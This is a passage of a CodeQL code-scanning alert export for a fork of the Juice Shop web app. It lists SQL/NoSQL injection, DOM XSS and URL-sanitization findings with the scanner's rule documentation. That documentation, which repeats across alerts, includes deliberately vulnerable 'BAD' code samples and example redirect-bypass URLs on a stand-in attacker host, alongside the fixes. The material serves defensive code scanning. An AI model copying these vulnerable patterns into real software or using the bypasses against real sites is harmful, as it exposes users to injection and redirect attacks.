ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This query string depends on a user-provided value.\nThis query string depends on a user-provided value."},"location":{"path":"routes/login.ts","start_line":36,"end_line":36,"start_column":28,"end_column":170},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/11/instances","dismissal_approved_by":null},{"number":10,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/10","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/10","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sql-injection","severity":"error","description":"Database query built from user-controlled sources","name":"js/sql-injection","tags":["external/cwe/cwe-089","external/cwe/cwe-090","external/cwe/cwe-943","security"],"full_description":"Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.","help":"# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This query object depends on a user-provided value.\nThis query object depends on a user-provided value."},"location":{"path":"routes/likeProductReviews.ts","start_line":42,"end_line":42,"start_column":21,"end_column":32},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/10/instances","dismissal_approved_by":null},{"number":9,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/9","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/9","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sql-injection","severity":"error","description":"Database query built from user-controlled sources","name":"js/sql-injection","tags":["external/cwe/cwe-089","external/cwe/cwe-090","external/cwe/cwe-943","security"],"full_description":"Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.","help":"# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This query object depends on a user-provided value.\nThis query object depends on a user-provided value."},"location":{"path":"routes/likeProductReviews.ts","start_line":31,"end_line":31,"start_column":46,"end_column":57},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/9/instances","dismissal_approved_by":null},{"number":8,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/8","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/8","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sql-injection","severity":"error","description":"Database query built from user-controlled sources","name":"js/sql-injection","tags":["external/cwe/cwe-089","external/cwe/cwe-090","external/cwe/cwe-943","security"],"full_description":"Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.","help":"# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This query object depends on a user-provided value.\nThis query object depends on a user-provided value."},"location":{"path":"routes/likeProductReviews.ts","start_line":25,"end_line":25,"start_column":13,"end_column":24},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/8/instances","dismissal_approved_by":null},{"number":7,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/7","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/7","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sql-injection","severity":"error","description":"Database query built from user-controlled sources","name":"js/sql-injection","tags":["external/cwe/cwe-089","external/cwe/cwe-090","external/cwe/cwe-943","security"],"full_description":"Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.","help":"# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This query object depends on a user-provided value.\nThis query object depends on a user-provided value."},"location":{"path":"routes/likeProductReviews.ts","start_line":18,"end_line":18,"start_column":34,"end_column":45},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/7/instances","dismissal_approved_by":null},{"number":6,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/6","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/6","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/xss","severity":"error","description":"Client-side cross-site scripting","name":"js/xss","tags":["external/cwe/cwe-079","external/cwe/cwe-116","security"],"full_description":"Writing user input directly to the DOM allows for a cross-site scripting vulnerability.","help":"# Client-side cross-site scripting\nDirectly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.\n\nThis kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.\n\n\n## Recommendation\nTo guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.\n\n\n## Example\nThe following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\")+8);\n    document.write(\"<OPTION value=1>\"+deflt+\"</OPTION>\");\n    document.write(\"<OPTION value=2>English</OPTION>\");\n}\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Cross-site scripting vulnerability due to user-provided value."},"location":{"path":"frontend/src/app/search-result/search-result.component.ts","start_line":151,"end_line":151,"start_column":65,"end_column":75},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/6/instances","dismissal_approved_by":null},{"number":5,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-02-04T23:51:19Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/5","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/5","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/incomplete-url-substring-sanitization","severity":"warning","description":"Incomplete URL substring sanitization","name":"js/incomplete-url-substring-sanitization","tags":["correctness","external/cwe/cwe-020","security"],"full_description":"Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.","help":"# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\");\n    // BAD: the host of `url` may be controlled by an attacker\n    if (url.includes(\"example.com\")) {\n        res.redirect(url);\n    }\n});\n\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```javascript\napp.get('/some/path', function(req, res) {\n    let url = req.param(\"url\"),\n        host = urlLib.parse(url).host;\n    // BAD: the host of `url` may be controlled 